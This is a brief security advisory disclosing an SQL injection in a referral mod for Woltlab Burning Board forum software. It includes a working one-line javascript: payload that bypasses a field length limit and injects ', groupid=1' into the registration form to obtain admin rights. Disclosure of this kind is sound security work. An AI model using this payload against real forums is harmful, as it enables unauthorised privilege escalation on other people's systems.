Description:
With the "Guthaben hack" (that includes Zwerg's "User Werben Hack" 3.0)
for Woltlab Burning Board you can get credits for promoting new members.
The new user may add the promoter's ID into the registration form, so he
can get his credits.

Due to an input validation bug the "User Werben"-MOD is vulnerable to an
sql-injection attack. This makes it possible for an malicious user to
gain admin rights. 
 
  
Exploit:
The field got a maxlength-value of 10, so the attacker may use IE +
javascript to inject the sql-string:

javascript:x=document.forms[0].geworbenv;x.value=",
groupid=1";alert(x.value);
 
  
Vendor:
Vendor has been contacted by php-masta, no reply received. 
 
  
Thanks:
php-masta (php-masta.net) for inviting me to join his board ;)
